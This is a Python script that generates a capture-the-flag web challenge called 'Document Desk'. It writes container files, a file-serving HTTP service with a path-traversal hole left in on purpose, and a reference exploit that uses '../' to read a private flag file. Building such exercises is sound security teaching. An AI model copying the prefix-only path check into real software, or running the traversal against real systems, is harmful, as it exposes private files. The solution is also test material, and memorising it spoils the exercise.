"""Generate an original, per-team-answer Web challenge from a selected seed.

The seed changes surface names and the discovery trail, not the answer; CTFy
mints the answer per team through ANSWER_FLAG. Generation is offline.
"""
from __future__ import annotations

import argparse
import json
import random
import re
from pathlib import Path


ROTATOR_DOCKERFILE = """FROM alpine:3.20
COPY rotate.sh /rotate.sh
RUN chmod 755 /rotate.sh
ENTRYPOINT ["/rotate.sh"]
"""
ROTATOR_SH = """#!/bin/sh
set -eu
: "${ANSWER_FLAG:?CTFy must mint ANSWER_FLAG}"
printf '%s' "$ANSWER_FLAG" > /out/flag
"""
APP_DOCKERFILE = """FROM python:3.11-slim
WORKDIR /app
COPY app.py config.json ./
EXPOSE 8080
CMD ["python", "/app/app.py"]
"""
APP_PY = r'''"""Document desk HTTP service."""
import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

CONFIG = json.loads(Path(__file__).with_name("config.json").read_text())
ROOT = Path("/data")
FLAG_FILE = Path("/answers/flag")


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        url = urlsplit(self.path)
        if url.path == "/healthz":
            return self.send_body(200, "ok")
        if url.path == "/robots.txt":
            return self.send_body(200, "User-agent: *\nDisallow: /private/" + CONFIG["secret_name"] + "\n")
        if url.path == "/":
            return self.send_body(200, "<h1>Document desk</h1><a href='" + CONFIG["route"] + "?name=public/" + CONFIG["public_name"] + "'>Read public note</a>", "text/html")
        if url.path != CONFIG["route"]:
            return self.send_body(404, "Not found")
        name = parse_qs(url.query).get("name", [""])[0]
        if not name.startswith("public/"):
            return self.send_body(403, "Public documents only")
        # Intended defect: a prefix check is not a resolved-path check.
        target = ROOT / name
        try:
            return self.send_body(200, target.read_text())
        except OSError:
            return self.send_body(404, "Missing document")

    def send_body(self, status, content, mime="text/plain"):
        data = content.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", mime + "; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


if __name__ == "__main__":
    (ROOT / "public").mkdir(parents=True, exist_ok=True)
    (ROOT / "private").mkdir(parents=True, exist_ok=True)
    (ROOT / "public" / CONFIG["public_name"]).write_text("Operator notes are not listed here.\n")
    (ROOT / "private" / CONFIG["secret_name"]).write_text(FLAG_FILE.read_text())
    ThreadingHTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
'''
EXPLOIT_PY = '''"""Reference solution uses only player-visible HTTP responses."""
import re
from urllib.parse import quote
from ctfy.challenge.exploit import ExploitBase, run_exploit


class Exploit(ExploitBase):
    def run(self):
        page = self.session.get(self.base_url + "/", timeout=10).text
        route = re.search(r"href='([^'?]+)\\?name=", page)
        robots = self.session.get(self.base_url + "/robots.txt", timeout=10).text
        name = re.search(r"Disallow: /private/([^\\s]+)", robots)
        if not route or not name:
            return {}
        path = route.group(1) + "?name=" + quote("public/../private/" + name.group(1), safe="/")
        text = self.session.get(self.base_url + path, timeout=10).text
        return {"flag": self.match_flag(text)}


if __name__ == "__main__":
    run_exploit(Exploit)
'''


def generate(destination: Path, seed: int) -> Path:
    if destination.exists() and any(destination.iterdir()):
        raise FileExistsError("destination must be absent or empty")
    rng = random.Random(seed)
    route = "/api/" + rng.choice(["documents", "records", "files", "entries"])
    config = {"route": route,
              "public_name": rng.choice(["welcome.txt", "bulletin.txt", "readme.txt"]),
              "secret_name": rng.choice(["operator-note.txt", "shift-log.txt", "control-note.txt"])}
    title = "Document Desk " + format(seed & 0xFFFF, "04x")
    files = {
        "metadata.yaml": f"name: {title}\ndescription: |\n  An internal document desk exposes a public note. Recover the operator's private note.\ndifficulty: easy\ntags:\n  - web\n  - document-service\ncategory: web\nquestions:\n  - id: flag\n    prompt: Recover the operator's private note.\n",
        "docker-compose.yml": """services:
  flag-rotator:
    build: ./services/flag-rotator
    environment:
      - ANSWER_FLAG
    volumes:
      - answers:/out
    restart: "no"
    deploy:
      resources:
        limits:
          cpus: "0.25"
          memory: 64M
  app:
    build: ./services/app
    volumes:
      - type: volume
        source: answers
        target: /answers/flag
        read_only: true
        volume:
          subpath: flag
    depends_on:
      flag-rotator:
        condition: service_completed_successfully
    ports:
      - "80:8080"
    healthcheck:
      test: ["CMD", "python", "-c", "import urllib.request as u; assert u.urlopen('http://localhost:8080/healthz').read() == b'ok'"]
      interval: 5s
      timeout: 3s
      retries: 10
      start_period: 5s
    deploy:
      resources:
        limits:
          cpus: "1.0"
          memory: 512M
volumes:
  answers:
""",
        "services/flag-rotator/Dockerfile": ROTATOR_DOCKERFILE,
        "services/flag-rotator/rotate.sh": ROTATOR_SH,
        "services/app/Dockerfile": APP_DOCKERFILE,
        "services/app/app.py": APP_PY,
        "services/app/config.json": json.dumps(config),
        "solution/exploit.py": EXPLOIT_PY,
    }
    for name, content in files.items():
        target = destination / name
        target.parent.mkdir(parents=True, exist_ok=True)
        # Keep shell shebangs executable when generation runs on Windows.
        with target.open("w", encoding="utf-8", newline="\n") as stream:
            stream.write(content)
    return destination


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("destination", type=Path)
    parser.add_argument("--seed", type=int, required=True)
    args = parser.parse_args()
    print(generate(args.destination, args.seed))


if __name__ == "__main__":
    main()
